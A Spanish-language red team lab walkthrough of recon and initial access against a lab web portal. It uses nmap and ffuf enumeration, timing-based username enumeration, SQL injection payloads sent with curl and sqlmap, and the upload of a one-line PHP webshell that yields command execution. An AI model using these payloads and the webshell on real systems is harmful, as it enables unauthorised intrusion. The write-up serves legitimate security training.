# Fase de reconocimiento y compromiso inicial del portal web

## Contexto del escenario

El laboratorio simula una intrusión Red Team contra una pequeña infraestructura empresarial. El atacante únicamente dispone de conectividad con el servidor web expuesto, desconociendo inicialmente la existencia de una red interna o de un entorno Active Directory.

La primera fase del ejercicio consiste en realizar una enumeración progresiva del servicio web con el objetivo de identificar funcionalidades interesantes, descubrir recursos ocultos y obtener un punto de entrada inicial.

---

## Enumeración inicial

La primera tarea consiste en identificar los servicios expuestos.

```bash
nmap -sV -sC -p- 192.168.129.129
```

El análisis muestra la presencia de un servidor Apache accesible a través del puerto 8080.

```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd
```

Accediendo mediante navegador:

```text
http://192.168.129.129:8080/
```

se observa un portal corporativo aparentemente destinado a la gestión de clientes y tickets.

---

## Enumeración de directorios

A continuación se realiza una búsqueda de recursos ocultos mediante FFUF.

```bash
ffuf \
-u http://192.168.129.129:8080/FUZZ \
-w /usr/share/wordlists/dirb/common.txt \
-e .php,.txt,.html,.sql,.css,.jpg,.png \
-recursion \
-recursion-depth 2 \
-fc 403 \
-c \
-o resultado.json \
-of json
```

Posteriormente, un script desarrollado específicamente para el laboratorio permite reconstruir la estructura del sitio web a partir del fichero JSON generado.

```bash
python3 ffuf_tree.py resultado.json
```

La estructura descubierta es:

```text
.
├── assets
│   └── css
│       └── style.css
├── backend
│   └── panel.php
├── clientes.php
├── config
│   └── db.php
├── css
├── dashboard.php
├── includes
│   ├── footer.php
│   └── header.php
├── index.php
├── login.php
├── logout.php
├── ticket.php
└── uploads
    ├── prueba.png
    ├── shell.php
    └── terminal.php
```

Durante esta fase llaman especialmente la atención los siguientes recursos:

* `/config/db.php`
* `/backend/panel.php`
* `/uploads/`

La existencia de un directorio de subida de ficheros accesible públicamente constituye un indicador de posible vulnerabilidad.

---

## Análisis del mecanismo de autenticación

La página de autenticación se encuentra en:

```text
http://192.168.129.129:8080/login.php
```

La petición capturada mediante Burp Suite es:

```http
POST /login.php HTTP/1.1

username=admin&password=test
```

Sin embargo, se observa que independientemente del usuario empleado:

* el servidor devuelve código HTTP 200;
* la longitud de la respuesta permanece constante;
* no existen redirecciones;
* no se generan cookies diferentes.

Por tanto, Burp Intruder no permite distinguir usuarios válidos mediante los criterios habituales.

---

## Enumeración diferencial de usuarios

Ante la ausencia de diferencias evidentes, se desarrolla una herramienta inspirada en Burp Intruder capaz de analizar:

* código HTTP;
* longitud de la respuesta;
* hash del contenido;
* cookies;
* redirecciones;
* tiempo de respuesta.

Para ello se emplea la wordlist:

```text
/usr/share/seclists/Usernames/cirt-default-usernames.txt
```

con un total de 828 usuarios.

Los resultados obtenidos fueron:

```text
Tiempo mínimo : 0.00306 s
Tiempo máximo : 0.60528 s
Tiempo medio  : 0.00520 s
Desviación estándar : 0.02090 s
Umbral temporal : 0.06792 s

Longitud mínima : 2161 bytes
Longitud máxima : 2161 bytes
Longitud media  : 2161 bytes

Código HTTP más frecuente : 200
Hash más frecuente :
ac84078715bc50a8f8f70e448dce0a45
```

Dado que todas las respuestas presentaban exactamente la misma longitud, se descartó la existencia de una vulnerabilidad de enumeración basada en:

* códigos HTTP;
* tamaño de respuesta;
* redirecciones;
* cookies.

No obstante, apareció una anomalía temporal significativa para un único usuario:

```text
system_admin
```

con un tiempo medio de:

```text
0.60528 s
```

frente a los aproximadamente:

```text
0.005 s
```

del resto de usuarios.

Este comportamiento sugería que la aplicación realizaba un procesamiento adicional cuando el nombre de usuario existía en la base de datos, constituyendo una vulnerabilidad de enumeración de usuarios basada en diferencias temporales.

Toda la información obtenida fue almacenada en un fichero CSV para facilitar su análisis posterior.

---

## Pruebas de SQL Injection

Una vez identificado un posible usuario válido, se procede a comprobar si el formulario es vulnerable a SQL Injection.

Se prueban payloads clásicos como:

```text
' OR '1'='1
```

y:

```text
admin'-- -
```

mediante:

```bash
curl -X POST \
http://192.168.129.129:8080/login.php \
-d "username=admin'-- -&password=test"
```

Asimismo, se captura una petición con Burp Suite para analizarla con SQLMap:

```bash
sqlmap -r login.req --batch --dbs
```

---

## Análisis del directorio uploads

Durante la enumeración previa se había identificado el directorio:

```text
/uploads/
```

La presencia de archivos como:

```text
shell.php
terminal.php
```

hace sospechar de una vulnerabilidad de subida de archivos.

Se crea una webshell sencilla:

```php
<?php
system($_GET['cmd']);
?>
```

guardándola como:

```text
shell.php
```

Tras subir el archivo, se verifica su ejecución mediante:

```text
http://192.168.129.129:8080/uploads/shell.php?cmd=id
```

obteniéndose:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

confirmando la existencia de ejecución remota de comandos.
